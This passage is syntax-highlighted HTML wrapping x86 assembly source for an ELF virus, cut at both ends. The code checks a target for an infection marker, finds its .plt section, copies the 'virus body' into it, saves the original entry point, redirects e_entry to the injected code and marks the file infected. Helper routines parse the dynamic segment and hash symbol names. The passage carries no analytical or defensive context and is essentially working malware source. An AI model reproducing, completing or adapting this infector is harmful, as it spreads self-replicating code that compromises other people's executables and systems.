        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; already infected?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.unmap</span><span class="sc0">      
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x00030002</span><span class="sc0">    </span><span class="sc1">; e_type == ET_EXEC &amp;&amp;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.unmap</span><span class="sc0">              </span><span class="sc1">; e_machine == EM_386</span><span class="sc0">
        
        </span><span class="sc1">; shdr and shnum</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">e_shoff</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">e_shnum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">; .strtab</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">e_shstrndx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ehdr-&gt;e_shstrndx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; * 40</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">            </span><span class="sc1">; + shdr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sh_offset</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; sh_offset</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">; strtab = m + shdr[ehdr-&gt;e_shstrndx].sh_offset</span><span class="sc0">
        </span><span class="sc1">; find PLT section</span><span class="sc0">
    </span><span class="sc5">.fplt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sh_name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.plt'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.found</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">.fplt</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.unmap</span><span class="sc0">
    </span><span class="sc5">.found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sh_addr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">new_entry</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc1">; check section size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sh_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">O</span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">.unmap</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sh_offset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">plt_ptr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        
        </span><span class="sc1">; check that offsets/addreses in PLT entries are contiguos</span><span class="sc0">
        </span><span class="sc1">; this could be enforced or contrarily removed if you sure</span><span class="sc0">
        </span><span class="sc1">; that entries are always sorted</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc5">.check</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.first</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.unmap</span><span class="sc0">  
    </span><span class="sc5">.first</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.loop</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">gotp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">orel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pcnt</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">.loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">.check</span><span class="sc0">

        </span><span class="sc1">; write virus body</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">plt_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">O</span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        
        </span><span class="sc1">; save PLT's first ptr to GOT, offset in .rel.plt, count, old entry point</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">plt_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">gotp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">first_got</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">orel</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">first_rel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pcnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">plt_count</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">e_entry</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">old_entry</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc1">; change entry point, set infection mark</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">new_entry</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">e_entry</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">.unmap</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_length</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">munmap</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">.close</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
    </span><span class="sc5">.fail</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
        
</span><span class="sc5">unwind</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_dyn_file_base</span><span class="sc0">
</span><span class="sc1">;       or  eax, eax</span><span class="sc0">
</span><span class="sc1">;       jz  fail</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; memory base - file base</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">DT_PLTGOT</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_from_dyn</span><span class="sc0">
</span><span class="sc1">;       or  eax, eax</span><span class="sc0">
</span><span class="sc1">;       jz  fail</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; get_base(addr) - return base address of the loaded ELF file</span><span class="sc0">
</span><span class="sc5">get_base</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xf000</span><span class="sc0">
    </span><span class="sc5">.loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0x464c457f</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.next</span><span class="sc0">
</span><span class="sc1">;       cmp dword [eax + 4], 0x00010101</span><span class="sc0">
</span><span class="sc1">;       jne .next</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">.next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.loop</span><span class="sc0">
</span><span class="sc1">; get_from_dyn(DYNAMIC, tag) - return the DYNAMIC entry with given tag</span><span class="sc0">
</span><span class="sc5">get_from_dyn</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">.loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">.done</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.done</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">.loop</span><span class="sc0">
    </span><span class="sc5">.done</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc1">; uint64_t get_dyn_file_base(elf_file) return VA of DYNAMIC and lowest VA in ELF file</span><span class="sc0">
</span><span class="sc5">get_dyn_file_base</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">e_phnum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">e_phoff</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">.loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">p_type</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PT_LOAD</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.more</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">p_vaddr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">.more</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">p_vaddr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">.more</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PT_DYNAMIC</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.next</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">p_vaddr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">.next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">.loop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">.fail</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">.fail</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">; elf_hash(name)</span><span class="sc0">
</span><span class="sc5">elf_hash</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; edx - h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; name</span><span class="sc0">
    </span><span class="sc5">.next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">
